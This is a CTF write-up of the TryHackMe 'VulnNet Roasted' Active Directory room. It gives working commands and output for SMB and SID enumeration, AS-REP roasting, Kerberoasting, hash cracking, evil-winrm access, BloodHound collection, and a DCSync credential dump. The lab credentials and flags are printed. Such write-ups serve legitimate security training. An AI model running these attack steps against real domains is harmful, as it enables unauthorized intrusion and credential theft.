---
title: Vulnnet Roasted
date: 2025-04-26 00:00:00 +/-TTTT
categories:
  - Practice
  - Tryhackme - Active Directory
tags:
  - ldapsearch
  - smbclient
  - smbmap
  - impacket-lookupsid
  - crackmapexec
  - grep
  - gawk
  - tee
  - asreproasting
  - impacket-getnpusers
  - john
  - kerberoasting
  - impacket-getuserspns
  - hashcat
  - evil-winrm
  - bloodhound-python
  - bloodhound
  - impacket-wmiexec
  - dcsync
  - impacket-secretsdump
image: preview-image.png
media_subpath: /assets/img/Practice/Tryhackme - Active Directory/2025-05-31-vulnnet-roasted/
---

This [room](https://tryhackme.com/room/vulnnetroasted) from tryhackme is a staright forward CTF style machine where the goal is to enumerate user through IPC$ SMB share and next performing for an AS-REP Roasting attack on found users. Once found such we are assusmed to perform a kerberoasting attack as for that particulare user their is now way to obtain a shell on target while credentials still being valid. lasty re-enumerate SMB share with the new user privileges and finding a script in SYSVOL and NETLOGON, which includes password of a domain admin. Hence giving in our power to perform a DCSync attack.

## Enumeration

### Nmap

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 22:53 PDT
Nmap scan report for 10.10.84.2
Host is up (0.17s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-05 05:53:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49665/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-06-05T05:54:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.69 seconds
```

* found nothing on DNS.

### LDAP

* using ldapsearch we found the naming context of target domain/system.

```bash
┌──(kali㉿kali)-[~/Desktop/vulnnetroasted]
└─$ ldapsearch -H ldap://10.10.84.2 -x -s base namingcontexts 
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=vulnnet-rst,DC=local
namingcontexts: CN=Configuration,DC=vulnnet-rst,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=vulnnet-rst,DC=local
namingcontexts: DC=DomainDnsZones,DC=vulnnet-rst,DC=local
namingcontexts: DC=ForestDnsZones,DC=vulnnet-rst,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

* thus its `DC=vulnnet-rst,DC=local` which resolves to - `vulnnet-rst.local`.
* we tried to enumerate further with this but got no luck, as it looks anonymous LDAP queries are not allowed.

```bash
┌──(kali㉿kali)-[~/Desktop/vulnnetroasted]
└─$ ldapsearch -H ldap://10.10.84.2 -x -b "DC=vulnnet-rst,DC=local"
# extended LDIF
#
# LDAPv3
# base <DC=vulnnet-rst,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

* but again found nothing.

### SMB

* on smb we found following share using smbclient.

```bash
┌──(kali㉿kali)-[~/Desktop/vulnnetroasted]
└─$ smbclient -L \\\\10.10.84.2\\                      
Password for [WORKGROUP\kali]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.84.2 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

* out of which last 2 looks interesting.
* let check our access on this shares.

![](2025-05-31-vulnnet-roasted-2.png)

* good we have access on both of them, so let enumerate.
* on `VulnNet-Business-Anonymous` found some files and thus fetch it.

```bash
┌──(kali㉿kali)-[~/Desktop/vulnnetroasted]
└─$ smbclient \\\\10.10.84.2\\VulnNet-Business-Anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar 12 18:46:40 2021
  ..                                  D        0  Fri Mar 12 18:46:40 2021
  Business-Manager.txt                A      758  Thu Mar 11 17:24:34 2021
  Business-Sections.txt               A      654  Thu Mar 11 17:24:34 2021
  Business-Tracking.txt               A      471  Thu Mar 11 17:24:34 2021
get 
		8540159 blocks of size 4096. 4320502 blocks available
smb: \> get *
NT_STATUS_OBJECT_NAME_INVALID opening remote file \*
smb: \> mget *
Get file Business-Manager.txt? y
getting file \Business-Manager.txt of size 758 as Business-Manager.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
Get file Business-Sections.txt? y
getting file \Business-Sections.txt of size 654 as Business-Sections.txt (0.2 KiloBytes/sec) (average 0.3 KiloBytes/sec)
Get file Business-Tracking.txt? y
getting file \Business-Tracking.txt of size 471 as Business-Tracking.txt (0.2 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> exit
```

* also on another share `VulnNet-Enterprise-Anonymous` we found some more files and thus fetched it too.

```bash
┌──(kali㉿kali)-[~/Desktop/vulnnetroasted]
└─$ smbclient \\\\10.10.84.2\\VulnNet-Enterprise-Anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar 12 18:46:40 2021
  ..                                  D        0  Fri Mar 12 18:46:40 2021
  Enterprise-Operations.txt           A      467  Thu Mar 11 17:24:34 2021
  Enterprise-Safety.txt               A      503  Thu Mar 11 17:24:34 2021
  Enterprise-Sync.txt                 A      496  Thu Mar 11 17:24:34 2021

		8540159 blocks of size 4096. 4316986 blocks available
smb: \> mget *
Get file Enterprise-Operations.txt? y
getting file \Enterprise-Operations.txt of size 467 as Enterprise-Operations.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
Get file Enterprise-Safety.txt? y
getting file \Enterprise-Safety.txt of size 503 as Enterprise-Safety.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
Get file Enterprise-Sync.txt? y
getting file \Enterprise-Sync.txt of size 496 as Enterprise-Sync.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> exit
```

* just some text file with emails, nothing seems too interesting here.
* but we got some possible usernames.

![](2025-05-31-vulnnet-roasted-3.png)

![](2025-05-31-vulnnet-roasted-4.png)

* With this information, we can now try to guess the usernames, since they are probably some sort of variation of the usernames.
* E.g. firstname-lastname or first letter of firstname + lastname etc. This would most likely work but is rather depends on luck.
* for the purpose of making wordlist we can also use this [tool](https://github.com/PinkDraconian/CTF-bash-tools).

![](2025-05-31-vulnnet-roasted-5.png)

* However, there is a much easier method to obtain the usernames! Remember that there was a 3rd readable share - the IPC$ share.
* This allows us to anonymously enumerate for usernames on the system.
* The key idea here is that we can bruteforce the SIDs.
* If such a SID exists, the system will return the related username to that SID.
* This way, we can obtain a full list of available usernames.
* thus conclusion - **if IPC$ is readble, means user enumeration**
* thus for this here we can use lookupid from impacket.

```bash
┌──(kali㉿kali)-[~/Desktop/vulnnetroasted]
└─$ impacket-lookupsid anonymous@10.10.254.70 | tee usernames
Password:
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.254.70
[*] StringBinding ncacn_np:10.10.254.70[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

* we can also do this using crackmapexec.

```bash
crackmapexec smb 10.10.254.70 -u anonymous -p "" --rid-brute | tee usernames
```

![](2025-05-31-vulnnet-roasted-6.png)

* next we can simply grep for only usernames from saved output.

```bash
┌──(kali㉿kali)-[~/Desktop/vulnnetroasted]
└─$ cat usernames | grep SidTypeUser  |gawk -F '\' '{ print $2 }' |gawk -F ' ' '{ print $1 }' | tee username
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```

* now that we have a list of valid usernames we can try for AS-REP roasting attack.

```bash
┌──(kali㉿kali)-[~/Desktop/vulnnetroasted]
└─$ impacket-GetNPUsers -dc-ip 10.10.254.70 vulnnet-rst.local/ -usersfile username -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:4c5b3bc2731f8d9b47fffb241c337180$658e419172bc761cea3d999e7336afc268e5383de89863a660191cd27eaf96e202e33759b6e5714ef1078e708e25ecf4bdca0c1f404ef7ee89b22a09b6219bda2e139240c494dab9b8212cf56911c7de0d2b368d1df7ef185f2d14d660d9e422778dd520f70fdfa78dd4e69b1536ad7e61611cfa2fc8ecdff4549e9a7e9835e828e3e732f555bb1650a8c11e0487c049a7db050c96b2729340aafba468ebe4f40ff3d129544554daac0f30291a3710e1f18e6045b9af050ba559996e69db654a2e83a19d50ab38aeb5f9c5f07a3beb042d842c0622fa8f51588428a5e454adecba9d086339024f5e8907e4563dc1b22af441d9751a
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

* luckily we got a user who is set for `UF_DONT_REQUIRE_PREAUTH`.
* saved the hash in a text file and cracked it using john.

![](2025-05-31-vulnnet-roasted-7.png)

* got the full creds as - `t-skid:tj072889*`

## Exploitation

* as now we have a valid creds we can try to get a shell.
* but we cannot log in with any of the methods like psexec, smbexec, evil-winrm or RDP.
* … so what can we do now? Well, since these credentials are supposedly valid in the AD domain, we can try to perform a Kerberoasting attack.

```bash
impacket-GetUserSPNs "vulnnet-rst.local/t-skid:tj072889*" -dc-ip 10.10.254.70 -request
```

![](2025-05-31-vulnnet-roasted-8.png)

* got a KRB5 TGS Hash for an service account named `enterprise-core-vn`.
* cracked this hash with hashcat.

```bash
hashcat hash ../opt/rockyou.txt
```

![](2025-05-31-vulnnet-roasted-9.png)

* thus creds are `enterprise-core-vn:ry=ibfkfv,s6h,`
* now that we have another valid creds, we can again try to get a shell with same old methods.
* and this time it worked with evil-winrm and we got successful login.

```bash
┌──(kali㉿kali)-[~/Desktop/vulnnetroasted]
└─$ evil-winrm -i 10.10.254.70 -u enterprise-core-vn                         
Enter Password: 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
 
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> whoami
vulnnet-rst\enterprise-core-vn
```

* thus we got our user flag from user desktop.

```bash
*Evil-WinRM* PS C:\Users\enterprise-core-vn\desktop> type user.txt
THM{726b7c0baaac1455d05c827b5561f4ed}
```

## Privilege Escalation

* now as we are a user on target domain we can using 2 methods.
  1. standard windows privilege escalation checklist.
  2. domain enumeration.
* as we are on active directory i will go with 2.
* thus we will collect data for bloodhound and next view it in a graphical manner.
* we did this remotely using [bloodhound.py](https://github.com/fox-it/BloodHound.py)

```bash
bloodhound-python -u enterprise-core-vn -p "ry=ibfkfv,s6h," -ns 10.10.47.93 -d vulnnet-rst.local -c All
```

* next we uploaded all json file in bloodhound application and marked `t-skid` and `enterprise-core-vn` as owned.
* found nothing mush here, nor did any query result in for our path to domain admins.
* still we got to know that we have 2 accounts in domain admins - `a-whitehat` and `Administrator`.

![](2025-05-31-vulnnet-roasted-10.png)

* thus as next we have nothing on target, we can go back to basics.
* hence we can again enumerate for our access on SMB shares with this new user privileges.
* and we have 2 new share to enumerate.

```bash
┌──(kali㉿kali)-[~/Desktop/vulnnetroasted]
└─$ smbclient \\\\10.10.142.212\\NETLOGON --user=vulnnet-rst.local/enterprise-core-vn%ry=ibfkfv,s6h,
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Mar 16 16:15:49 2021
  ..                                  D        0  Tue Mar 16 16:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 16:18:14 2021

		8540159 blocks of size 4096. 4188235 blocks available
smb: \> get ResetPassword.vbs 
getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)
smb: \> exit
```

* both `SYSVOL` and `NETLOGON` share contained a `ResetPassword.vbs` script in diff. directories.
* its a big `.vbs` script which looks like to be doing a password reset as its name suggest.
* also inside it we found a user and password.

```bash
┌──(kali㉿kali)-[~/Desktop/vulnnetroasted]
└─$ cat ResetPassword.vbs 
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"

' Determine DNS domain name from RootDSE object.
Set objRootDSE = GetObject("LDAP://RootDSE")
strDNSDomain = objRootDSE.Get("defaultNamingContext")
---snip---
```

* thus let try this `a-whitehat:bNdKVkjv3RR9ht`

![](2025-05-31-vulnnet-roasted-11.png)

* great next we can again use tools from impacket to get a shell on target.

![](2025-05-31-vulnnet-roasted-12.png)

* from here we can try to perform a DCSync attack as a-whitehat is a domain admin.
* thus if successful we can dump full SAM database and get access to all the hashes from any user on the domain.

```bash
impacket-secretsdump vulnnet-rst.local/a-whitehat@10.10.111.177
```

![](2025-05-31-vulnnet-roasted-13.png)

* as we got the hash for Administrator we can agian use wmiexec and get a shell as administrator.

![](2025-05-31-vulnnet-roasted-14.png)

* finally got the system flag from here.

![](2025-05-31-vulnnet-roasted-15.png)
